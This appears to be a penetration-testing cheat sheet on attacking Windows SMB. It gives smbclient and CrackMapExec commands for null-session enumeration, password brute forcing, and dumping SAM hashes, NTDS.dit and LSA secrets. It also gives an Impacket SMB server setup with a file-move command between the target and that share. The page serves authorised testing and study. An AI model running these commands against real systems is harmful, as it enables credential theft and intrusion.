# SMB

:::tip Null Sessions

Do not forget to leverage null sessions to enumerate users, groups, shares, etc.

:::

## SMBClient

### Downloading files

Connect using the command below:

```bash
smbclient //<ip>/<share>
```

In interactive mode:

```bash
smb: \> mask ""
smb: \> recurse
smb: \> prompt
smb: \> mget *
```

## CrackMapExec

### Connecting using a null session

```bash
crackmapexec smb <ip> -u '' -p '' --shares
```

### Brute forcing credentials

```bash
crackmapexec smb <ip> -u <usersfile> -p <passwordsfile> | grep -v '\[-\]'
```

### Enumerating shares

```bash
crackmapexec smb <ip> -u <username> -p <password> --shares
```

### Enumerating users

```bash
crackmapexec smb <ip> -u <username> -p <password> --users
```

### Enumerating groups

```bash
crackmapexec smb <ip> -u <username> -p <password> --groups
```

### Enumerating password policy

```bash
crackmapexec smb <ip> -u <user> -p <password> --pass-pol
```

### Dumping SAM hashes

```bash
crackmapexec smb <ip> -u <username> -p <password> --sam
```

### Dumping NTDS.dit

```bash
crackmapexec smb <ip> -u <username> -p <password> --ntds
```

### Dumping LSA Secrets

```bash
crackmapexec smb <ip> -u <username> -p <password> --lsa
```

## Impacket

### Launch an SMB server

```bash
impacket-smbserver -smb2support <share name> <share path>
```

:::tip Moving files to the target machine

You can use the `cmd.exe`to move files to the target machine.

```batch
move <file> \\<ip>\<share>
```

:::
